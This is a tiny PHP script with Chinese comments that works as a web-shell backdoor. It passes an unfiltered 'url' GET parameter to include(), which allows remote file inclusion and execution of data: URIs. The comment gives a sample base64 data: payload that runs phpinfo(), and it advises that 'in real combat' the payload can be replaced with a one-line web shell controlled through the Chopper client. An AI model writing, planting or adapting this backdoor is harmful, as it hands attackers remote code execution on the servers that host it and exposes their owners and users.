<?php
function cc(){
    global $b;
    $a =$_GET[$b];  //此处可改成POST方式
    $str =$a;
    return $str;
}
?>
<?php
$b="url";
$c=cc();
$aa = $c;
 
include($aa);
/*
传入参数方式：
http://127.0.0.1/test/include.php?url=本地或远程文件名（或者利用data:image/png的这种格式）
例如：
http://127.0.0.1/test/include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
上看base64,后面为要执行的代码，代码要带，实战中可以把代码改成一句话，然后使用菜刀连接即可。

*/